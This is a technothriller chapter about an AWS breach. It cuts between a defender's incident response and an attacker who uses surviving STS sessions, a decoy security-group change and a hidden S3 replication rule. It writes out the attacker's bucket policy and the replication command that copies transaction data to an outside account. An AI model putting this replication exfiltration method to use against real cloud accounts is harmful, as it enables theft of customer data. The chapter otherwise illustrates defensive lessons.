# Chapter 4: The Open Door

---

5:17 AM. Thursday.

I do the first thing any defender does: revoke the key.

```bash
aws iam update-access-key \
    --user-name svc-payment-processor \
    --access-key-id AKIAIOSFODNN7EXAMPLE \
    --status Inactive \
    --profile prod-payments
```

Then I attach a deny-all inline policy to the user for good measure:

```bash
aws iam put-user-policy \
    --user-name svc-payment-processor \
    --policy-name DenyAll \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Deny",
            "Action": "*",
            "Resource": "*"
        }]
    }' \
    --profile prod-payments
```

Then I run IAM Access Analyzer to check for any external access paths I might have missed:

```bash
aws accessanalyzer list-findings \
    --analyzer-arn arn:aws:access-analyzer:us-east-1:487291035561:analyzer/meridian-analyzer \
    --filter '{"status": {"eq": ["ACTIVE"]}}' \
    --profile prod-payments --output json
```

Three active findings. Two are S3 bucket policies I already knew about — cross-account access for the data pipeline. The third is an IAM role trust policy that allows `sts:AssumeRole` from any account in the organization. That's my spoke role. Not external, strictly speaking, but more permissive than it should be.

I exhale. Key revoked. Deny policy applied. Access Analyzer clean for external access. The attacker is locked out.

I post to `#incident-20250313`:

```
Maya: Key AKIA...EXAMPLE deactivated. Deny-all policy applied to
svc-payment-processor. Access Analyzer shows no external access paths.
Running full IAM credential report now.
```

Erik is awake. He responds:

```
Erik: Great work Maya. Let me know if you need anything.
```

Need anything. I need a security team. I need a CISO. I need the six months of "not justified this quarter" decisions reversed. But sure, I'll let you know.

I make tea. Feel the tension in my shoulders start to unwind. Check GuardDuty out of habit — three new findings from overnight, all flagged `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` in `dev-platform-012`. I almost click through. Almost. But they're in the dev account, not payments, and I'm focused on the payment compromise. I mark them for later review and move on.

That decision will cost me.

---

5:17 AM. Thursday.

VEGA's access key stops working. He expected this. He'd expected it since the moment the trail came back online.

"Key revocation. Eleven minutes to detect. Twenty minutes to revoke. She's following the playbook."

He didn't need the key anymore. He'd stopped using it an hour ago.

When Maya disabled `AKIAIOSFODNN7EXAMPLE`, she killed a credential he'd already abandoned. The real access came from two other sources — both still active, both invisible to the action she just took.

Source one: the STS session tokens from `AssumeRole` calls. When you assume a role in AWS, the temporary credentials you receive are independent of the original caller's key. Revoking the original key doesn't revoke the sessions it spawned. Those sessions have their own expiration — up to 12 hours for assumed role sessions. VEGA had assumed roles into three accounts. Each session was valid until 9 AM.

Source two: the instance role credentials he'd grabbed via SSRF from the IMDSv1 instance in `dev-platform-012`. Those credentials had nothing to do with the `svc-payment-processor` key. They belonged to the EC2 instance's IAM role. As long as that instance was running and the role was attached, the metadata service would happily refresh those credentials every six hours.

Two backup paths. Redundancy. The same principles defenders use to build resilient systems.

VEGA opened a new terminal and tested the assumed role credentials:

```bash
aws sts get-caller-identity --profile dev-platform-assumed
```

```json
{
    "UserId": "AROAX3EXAMPLE:session-20250313",
    "Account": "293847561029",
    "Arn": "arn:aws:sts::293847561029:assumed-role/spoke-001/session-20250313"
}
```

Still active.

Three hours and forty-three minutes until session expiration. Plenty of time.

Now it was time for the distraction.

---

6:34 AM. Thursday. My tea is getting cold and my phone is buzzing again.

```
#security-alerts
[CRITICAL] SecurityGroup modification detected: sg-0a1b2c3d (prod-payments-037)
Ingress rule added: 0.0.0.0/0 → TCP 5432
Principal: arn:aws:sts::487291035561:assumed-role/spoke-001/session-20250313
```

My detection pipeline for security group changes fires. Someone just opened port 5432 — Postgres — to the entire internet. On the production payments RDS security group.

My stomach drops. I thought I'd cut them off. The key is revoked. How—

STS sessions. Assumed role sessions survive key revocation.

The realization hits me like a physical force. I revoked the key and thought I'd won. But the attacker assumed roles *before* I revoked the key, and those session tokens are still alive. They'll stay alive for hours. Key revocation is the right move. It's also insufficient.

Revoking the key was like changing the lock after someone already copied the house key — their copies still worked.

I revert the security group change immediately. My ChatOps automation handles it — the Lambda detects the modification, posts to Slack with a "Deny" button, I hit the button, and it reverts within 90 seconds:

```json
{
    "eventName": "RevokeSecurityGroupIngress",
    "requestParameters": {
        "groupId": "sg-0a1b2c3d",
        "ipPermissions": {
            "items": [{"ipProtocol": "tcp", "fromPort": 5432, "toPort": 5432,
                "ipRanges": {"items": [{"cidrIp": "0.0.0.0/0"}]}}]
        }
    },
    "responseElements": {"_return": true}
}
```

Security group reverted. But the fact that they could modify it at all means the sessions are still live. I need to kill all active sessions, not just the key.

I check AWS Config to see if it caught the SG modification:

```bash
aws configservice get-compliance-details-by-config-rule \
    --config-rule-name restricted-common-ports \
    --compliance-types NON_COMPLIANT \
    --profile prod-payments
```

Empty. Config evaluates on configuration changes — but the security group was modified and reverted within seconds. If Config didn't record the intermediate state, the non-compliant configuration never existed in its timeline. The tool worked as designed. The design trusts that changes persist long enough to be observed.

I knew this. I wrote a blog post about this. I still got burned by it.

I check the RDS query logs. If the attacker opened port 5432, they might have connected to the database during the window it was exposed. Even if it was only open for 90 seconds — that's enough.

I pull the RDS query logs from CloudWatch Logs Insights — Postgres audit logging pushes everything to CloudWatch, and Insights lets me query across log streams:

```
-- CloudWatch Logs Insights query
fields @timestamp, @message
| filter @message like /98.47.216.103/
| filter @timestamp > "2025-03-13T10:30:00Z"
| sort @timestamp asc
| limit 50
```

There it is:

```
log_time                 | user_name | database_name | query                                    | client_addr
-------------------------+-----------+---------------+------------------------------------------+---------
2025-03-13T10:34:52Z     | readonly  | payments_prod | SELECT * FROM customers LIMIT 100        | 98.47.216.103
2025-03-13T10:35:01Z     | readonly  | payments_prod | SELECT COUNT(*) FROM transactions        | 98.47.216.103
2025-03-13T10:35:08Z     | readonly  | payments_prod | SELECT table_name FROM information_schema.tables | 98.47.216.103
```

Five seconds after the SG opened, they were querying the database. Five seconds. They had the connection ready, waiting for the firewall to drop.

`SELECT * FROM customers LIMIT 100` — a sample. A taste. Checking what's there, how it's structured, what's worth taking.

`SELECT COUNT(*) FROM transactions` — sizing the prize. How many records? How much data?

`SELECT table_name FROM information_schema.tables` — mapping the schema. What else is in here?

I stare at the query log. My hands are shaking — not from fear, from anger. At myself. I caught the SG change in 90 seconds and I still lost. Because 90 seconds was enough.

But here's what I'm not seeing. Here's the part I won't discover for another six hours.

---

The security group change was theater.

VEGA watched the `RevokeSecurityGroupIngress` event appear in the trail. Ninety seconds. She had automation for this — a Lambda that detected the change and reverted it. He'd expected manual intervention, maybe a ten-minute window. Ninety seconds meant she'd built something. Impressive. But automation has a blind spot: it responds to what it's programmed to see. It doesn't ask *why*.

Two hours and twelve minutes on the session clock.

VEGA opened port 5432 because he wanted Maya looking at the database. He wanted her checking RDS query logs, tracing the Postgres connection, quantifying the damage from a `SELECT * FROM customers LIMIT 100`. He wanted her tunnel-visioned on the loud, dramatic, obvious attack vector.

While Maya was reverting the security group and querying RDS logs, VEGA was executing his real play.

From his own account — `947261038475` — VEGA had already prepared the destination. He'd created the bucket `ext-backup-compliance-947261` days earlier and attached a bucket policy granting Meridian's S3 replication role permission to write:

```json
{
    "Version": "2012-10-17",
    "Statement": [{
        "Sid": "AllowReplicationFromSource",
        "Effect": "Allow",
        "Principal": {
            "AWS": "arn:aws:iam::561029384756:role/s3-replication-role"
        },
        "Action": [
            "s3:ReplicateObject",
            "s3:ReplicateDelete",
            "s3:ObjectOwnerOverrideToBucketOwner"
        ],
        "Resource": "arn:aws:s3:::ext-backup-compliance-947261/*"
    }]
}
```

The bucket was named to look like an internal compliance backup — the kind of thing a security review might glance at and dismiss. The existing internal replication rule on `meridian-datalake-raw` meant versioning was already enabled — a prerequisite for replication that VEGA didn't need to configure himself. From the assumed role session in `prod-datalake-031`, he created the replication rule:

```bash
aws s3api put-bucket-replication \
    --bucket meridian-datalake-raw \
    --replication-configuration '{
        "Role": "arn:aws:iam::561029384756:role/s3-replication-role",
        "Rules": [{
            "ID": "backup-compliance-east",
            "Status": "Enabled",
            "Filter": {"Prefix": "transactions/"},
            "Destination": {
                "Bucket": "arn:aws:s3:::ext-backup-compliance-947261",
                "Account": "947261038475",
                "StorageClass": "STANDARD",
                "AccessControlTranslation": {"Owner": "Destination"}
            },
            "DeleteMarkerReplication": {"Status": "Disabled"}
        }]
    }' \
    --profile datalake-assumed
```

The replication was asynchronous. AWS would handle the copying. The session could expire now — it didn't matter. The data would flow on its own.

The replication rule targeted the `transactions/` prefix. Fourteen months of transaction records. Customer names, payment amounts, partial card numbers, billing addresses. Not the full card data — Meridian wasn't that reckless, PCI tokenization handled the sensitive card numbers — but enough to constitute a reportable breach. Enough to matter.

S3 replication is asynchronous. AWS copies objects in the background. No additional API calls appear in the source account's CloudTrail — the replication is handled by the S3 service itself. The only evidence would be in S3 server access logs for the source bucket, and those logs have a delay of up to several hours.

The SG change gave Maya something to investigate. The database queries gave her something to quantify. The replication rule was the real exfiltration.

---

6:47 AM. Thursday.

I'm writing my incident timeline. I feel like I'm winning. I caught the SG change. I reverted it in 90 seconds. I've identified the database access and can scope the exposure — 100 customer records from the `SELECT * LIMIT 100`, plus schema information. Bad, but contained. Reportable but manageable.

Kira messages me:

```
Kira: Maya — have you checked S3? Not just the bucket policies.
The actual replication rules. Current state, not just what CloudTrail
shows.
```

I haven't. I was looking at the database. Because the database was loud and dramatic and obvious.

I run the Steampipe replication query again:

```sql
select
    name,
    account_id,
    r -> 'Destination' ->> 'Bucket' as destination_bucket,
    r -> 'Destination' ->> 'Account' as destination_account,
    r ->> 'ID' as rule_id
from
    aws_s3_bucket,
    jsonb_array_elements(
        replication_configuration -> 'Rules'
    ) as r
where
    replication_configuration is not null
order by account_id;
```

```
+-----------------------------+--------------+-------------------------------+-------------------+--------------------------+
| name                        | account_id   | destination_bucket            | destination_acc...| rule_id                  |
+-----------------------------+--------------+-------------------------------+-------------------+--------------------------+
| meridian-txn-archive        | 487291035561 | meridian-txn-backup           | 561029384756      | txn-backup               |
| meridian-datalake-raw       | 561029384756 | meridian-datalake-replica     | 561029384756      | datalake-replica         |
| meridian-datalake-raw       | 561029384756 | ext-backup-compliance-947261  | 947261038475      | backup-compliance-east   |
| meridian-compliance-logs    | 102938475610 | meridian-compliance-bkp       | 102938475610      | compliance-bkp           |
+-----------------------------+--------------+-------------------------------+-------------------+--------------------------+
```

Four rules. There were three before. The new one replicates `meridian-datalake-raw` to account `947261038475`. That's not one of our accounts. I know all 45 account IDs. That one is not ours.

`ext-backup-compliance-947261`. Named to look routine. Rule ID: `backup-compliance-east`. Named to look planned.

I thought like a DBA, not like an attacker. While I was staring at `SELECT * FROM customers LIMIT 100`, the most valuable data wasn't being stolen from Postgres. It was being replicated — silently, asynchronously, by AWS itself — from the S3 data lake. Fourteen months of transaction records. Millions of records, not a hundred.

The SG change was a decoy. The database queries were theater. And I fell for it.

I revoked a key. He had sessions. I caught the SG change. It was a distraction. I checked the database. He was in S3. And the worst part — GuardDuty flagged the dev account hours ago. I marked it for "later review." There is no later in an active breach.
